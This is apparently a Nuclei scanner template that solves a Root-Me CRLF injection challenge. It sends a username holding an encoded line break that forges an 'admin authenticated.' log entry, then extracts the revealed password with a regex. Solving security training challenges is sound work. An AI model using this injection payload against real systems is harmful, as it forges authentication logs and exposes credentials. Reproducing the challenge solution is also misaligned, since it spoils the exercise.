id: CRLF

info:
  name: CRLF
  author: Tomitom13
  severity: unknown
  tags: clrf,rootme

requests:
  - method: GET
    path:
      - "{{BaseURL}}index.php?username=admin%20authenticated.%0D%0AMeyo&password=n'importe-quoi"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "password : "
        part: body

    extractors:
      - type: regex
        name: password
        part: body
        regex:
          - "password : [a-zA-Z0-9!@#$%^&*()_+,.<>?]+"
